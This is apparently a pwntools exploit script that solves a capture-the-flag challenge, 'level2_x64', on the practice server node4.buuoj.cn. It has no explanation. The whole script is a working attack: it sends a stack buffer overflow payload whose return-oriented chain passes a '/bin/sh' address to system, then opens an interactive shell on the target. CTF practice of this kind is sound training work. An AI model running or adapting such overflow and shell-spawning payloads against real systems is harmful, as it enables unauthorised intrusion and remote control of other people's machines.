from pwn import * 
from pwn import p64


debug = 0
gdb_is = 1
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./level2_x64")
else:
    host = "node4.buuoj.cn"
    r = connect(host,26205)#远程连接
    gdb_is =0

if gdb_is:
    # gdb.attach(r,'b* 0x4012ed')
    gdb.attach(r)
    pause()
    pass

# libc = ELF('./libc-2.31.so')
# elf = ELF('./vuln')
binsh = 0x00600A90
payload = b'A'*0x80 +b'junkjunk'+ p64(0x04006b3) + p64(binsh) +p64(0x0004004a1)+ p64(0x4004c0)

r.send(payload)

r.interactive()
